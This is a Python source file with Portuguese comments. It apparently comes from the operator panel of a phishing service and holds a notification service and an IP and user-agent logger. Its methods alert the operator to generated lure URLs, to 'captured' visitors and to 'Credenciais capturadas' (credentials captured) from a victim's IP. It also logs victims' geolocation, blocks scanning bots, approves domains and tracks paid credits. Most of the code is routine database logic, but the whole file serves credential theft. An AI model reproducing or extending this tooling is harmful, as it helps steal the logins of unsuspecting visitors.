from datetime import datetime, timedelta
from src.models.user import db, Notification, User
from src.services.telegram_service import TelegramService
import json

class NotificationService:
    """Serviço para gerenciar notificações in-app"""
    
    @staticmethod
    def create_notification(user_id, title, message, notification_type='info', 
                          priority='normal', data=None, action_url=None, 
                          action_text=None, expires_in_hours=None):
        """
        Cria uma nova notificação
        
        Args:
            user_id: ID do usuário
            title: Título da notificação
            message: Mensagem da notificação
            notification_type: Tipo (success, warning, error, info)
            priority: Prioridade (low, normal, high, urgent)
            data: Dados extras (dict)
            action_url: URL para ação relacionada
            action_text: Texto do botão de ação
            expires_in_hours: Horas até expirar (None = não expira)
        """
        try:
            expires_at = None
            if expires_in_hours:
                expires_at = datetime.utcnow() + timedelta(hours=expires_in_hours)
            
            notification = Notification(
                user_id=user_id,
                title=title,
                message=message,
                type=notification_type,
                priority=priority,
                action_url=action_url,
                action_text=action_text,
                expires_at=expires_at
            )
            
            if data:
                notification.set_data(data)
            
            db.session.add(notification)
            db.session.commit()
            
            return notification
            
        except Exception as e:
            db.session.rollback()
            print(f"Erro ao criar notificação: {e}")
            return None
    
    @staticmethod
    def get_user_notifications(user_id, include_read=True, include_dismissed=False, limit=50):
        """Obtém notificações do usuário"""
        try:
            query = Notification.query.filter_by(user_id=user_id)
            
            if not include_read:
                query = query.filter_by(is_read=False)
            
            if not include_dismissed:
                query = query.filter_by(is_dismissed=False)
            
            # Filtrar notificações não expiradas
            query = query.filter(
                db.or_(
                    Notification.expires_at.is_(None),
                    Notification.expires_at > datetime.utcnow()
                )
            )
            
            notifications = query.order_by(
                Notification.priority.desc(),
                Notification.created_at.desc()
            ).limit(limit).all()
            
            return notifications
            
        except Exception as e:
            print(f"Erro ao buscar notificações: {e}")
            return []
    
    @staticmethod
    def mark_as_read(notification_id, user_id):
        """Marca notificação como lida"""
        try:
            notification = Notification.query.filter_by(
                id=notification_id, 
                user_id=user_id
            ).first()
            
            if notification:
                notification.mark_as_read()
                db.session.commit()
                return True
            
            return False
            
        except Exception as e:
            db.session.rollback()
            print(f"Erro ao marcar notificação como lida: {e}")
            return False
    
    @staticmethod
    def dismiss_notification(notification_id, user_id):
        """Descarta notificação"""
        try:
            notification = Notification.query.filter_by(
                id=notification_id, 
                user_id=user_id
            ).first()
            
            if notification:
                notification.dismiss()
                db.session.commit()
                return True
            
            return False
            
        except Exception as e:
            db.session.rollback()
            print(f"Erro ao descartar notificação: {e}")
            return False
    
    @staticmethod
    def mark_all_as_read(user_id):
        """Marca todas as notificações do usuário como lidas"""
        try:
            notifications = Notification.query.filter_by(
                user_id=user_id,
                is_read=False
            ).all()
            
            for notification in notifications:
                notification.mark_as_read()
            
            db.session.commit()
            return len(notifications)
            
        except Exception as e:
            db.session.rollback()
            print(f"Erro ao marcar todas como lidas: {e}")
            return 0
    
    @staticmethod
    def get_unread_count(user_id):
        """Obtém contagem de notificações não lidas"""
        try:
            count = Notification.query.filter_by(
                user_id=user_id,
                is_read=False,
                is_dismissed=False
            ).filter(
                db.or_(
                    Notification.expires_at.is_(None),
                    Notification.expires_at > datetime.utcnow()
                )
            ).count()
            
            return count
            
        except Exception as e:
            print(f"Erro ao contar notificações não lidas: {e}")
            return 0
    
    @staticmethod
    def cleanup_expired_notifications():
        """Remove notificações expiradas"""
        try:
            expired = Notification.query.filter(
                Notification.expires_at < datetime.utcnow()
            ).all()
            
            for notification in expired:
                db.session.delete(notification)
            
            db.session.commit()
            return len(expired)
            
        except Exception as e:
            db.session.rollback()
            print(f"Erro ao limpar notificações expiradas: {e}")
            return 0
    
    # Métodos para criar notificações específicas do sistema
    
    @staticmethod
    def notify_url_generated(user_id, url_data):
        """Notifica sobre URL gerada"""
        return NotificationService.create_notification(
            user_id=user_id,
            title="Nova URL Gerada",
            message=f"URL criada com sucesso: {url_data.get('url', 'N/A')}",
            notification_type='success',
            data=url_data,
            action_url=f"/urls/{url_data.get('id')}",
            action_text="Ver Detalhes"
        )
    
    @staticmethod
    def notify_visitor_captured(user_id, visitor_data):
        """Notifica sobre visitante capturado"""
        return NotificationService.create_notification(
            user_id=user_id,
            title="Visitante Capturado",
            message=f"Dados capturados de {visitor_data.get('ip', 'IP desconhecido')}",
            notification_type='info',
            priority='high',
            data=visitor_data,
            action_url="/history",
            action_text="Ver Histórico"
        )
    
    @staticmethod
    def notify_bot_detected(user_id, bot_data):
        """Notifica sobre bot detectado"""
        return NotificationService.create_notification(
            user_id=user_id,
            title="Bot Detectado",
            message=f"Bot bloqueado: {bot_data.get('ip', 'IP desconhecido')}",
            notification_type='warning',
            priority='high',
            data=bot_data,
            action_url="/protection",
            action_text="Ver Proteções"
        )
    
    @staticmethod
    def notify_url_expired(user_id, url_data):
        """Notifica sobre URL expirada"""
        return NotificationService.create_notification(
            user_id=user_id,
            title="URL Expirada",
            message=f"A URL {url_data.get('url', 'N/A')} expirou",
            notification_type='warning',
            data=url_data,
            action_url="/urls",
            action_text="Gerenciar URLs"
        )
    
    @staticmethod
    def notify_credits_low(user_id, credits_remaining):
        """Notifica sobre créditos baixos"""
        return NotificationService.create_notification(
            user_id=user_id,
            title="Créditos Baixos",
            message=f"Você tem apenas {credits_remaining} créditos restantes",
            notification_type='warning',
            priority='high',
            data={'credits': credits_remaining},
            action_url="/settings",
            action_text="Gerenciar Conta",
            expires_in_hours=24
        )
    
    @staticmethod
    def notify_domain_approved(user_id, domain_data):
        """Notifica sobre domínio aprovado"""
        return NotificationService.create_notification(
            user_id=user_id,
            title="Domínio Aprovado",
            message=f"Seu domínio {domain_data.get('name', 'N/A')} foi aprovado",
            notification_type='success',
            priority='high',
            data=domain_data,
            action_url="/domains",
            action_text="Ver Domínios"
        )
    
    @staticmethod
    def notify_security_alert(user_id, alert_data):
        """Notifica sobre alerta de segurança"""
        return NotificationService.create_notification(
            user_id=user_id,
            title="Alerta de Segurança",
            message=alert_data.get('message', 'Atividade suspeita detectada'),
            notification_type='error',
            priority='urgent',
            data=alert_data,
            action_url="/security",
            action_text="Ver Detalhes",
            expires_in_hours=48
        )



class IPLogger:
    """Classe para logging e análise de IPs"""
    
    @staticmethod
    def get_ip_info(ip_address):
        """Obtém informações sobre o IP"""
        try:
            import requests
            
            # Usar serviço gratuito para obter informações do IP
            response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
            if response.status_code == 200:
                data = response.json()
                return {
                    'country': data.get('country', 'Desconhecido'),
                    'region': data.get('regionName', 'Desconhecido'),
                    'city': data.get('city', 'Desconhecido'),
                    'isp': data.get('isp', 'Desconhecido'),
                    'org': data.get('org', 'Desconhecido'),
                    'timezone': data.get('timezone', 'Desconhecido'),
                    'lat': data.get('lat'),
                    'lon': data.get('lon')
                }
        except Exception as e:
            print(f"Erro ao obter informações do IP: {e}")
        
        return {
            'country': 'Desconhecido',
            'region': 'Desconhecido',
            'city': 'Desconhecido',
            'isp': 'Desconhecido',
            'org': 'Desconhecido',
            'timezone': 'Desconhecido',
            'lat': None,
            'lon': None
        }
    
    @staticmethod
    def parse_user_agent(user_agent):
        """Analisa o User-Agent"""
        try:
            from user_agents import parse
            
            ua = parse(user_agent)
            return {
                'browser': ua.browser.family,
                'browser_version': ua.browser.version_string,
                'os': ua.os.family,
                'os_version': ua.os.version_string,
                'device': ua.device.family,
                'is_mobile': ua.is_mobile,
                'is_tablet': ua.is_tablet,
                'is_pc': ua.is_pc,
                'is_bot': ua.is_bot
            }
        except Exception as e:
            print(f"Erro ao analisar User-Agent: {e}")
            return {
                'browser': 'Desconhecido',
                'browser_version': 'Desconhecido',
                'os': 'Desconhecido',
                'os_version': 'Desconhecido',
                'device': 'Desconhecido',
                'is_mobile': False,
                'is_tablet': False,
                'is_pc': True,
                'is_bot': False
            }

# Instância global para uso
ip_logger = IPLogger()

# Adicionar métodos específicos ao NotificationService
def add_notification_methods():
    """Adiciona métodos específicos ao NotificationService"""
    
    @staticmethod
    def notify_visitor_access(visitor, generated_url, user):
        """Notifica sobre acesso de visitante"""
        visitor_data = {
            'ip': visitor.ip_address,
            'country': visitor.country,
            'city': visitor.city,
            'browser': visitor.browser,
            'os': visitor.operating_system,
            'url': generated_url.full_url if generated_url else 'N/A'
        }
        
        return NotificationService.create_notification(
            user_id=user.id,
            title="Novo Visitante",
            message=f"Acesso detectado de {visitor.ip_address} ({visitor.country})",
            notification_type='info',
            priority='normal',
            data=visitor_data,
            action_url="/history",
            action_text="Ver Histórico"
        )
    
    @staticmethod
    def notify_data_capture(visitor, captured_data, generated_url, user):
        """Notifica sobre captura de dados"""
        capture_data = {
            'ip': visitor.ip_address,
            'country': visitor.country,
            'captured_fields': list(captured_data.keys()) if captured_data else [],
            'url': generated_url.full_url if generated_url else 'N/A'
        }
        
        return NotificationService.create_notification(
            user_id=user.id,
            title="Dados Capturados",
            message=f"Credenciais capturadas de {visitor.ip_address}",
            notification_type='success',
            priority='high',
            data=capture_data,
            action_url="/history",
            action_text="Ver Dados"
        )
    
    # Adicionar métodos à classe
    NotificationService.notify_visitor_access = notify_visitor_access
    NotificationService.notify_data_capture = notify_data_capture

# Executar a adição dos métodos
add_notification_methods()

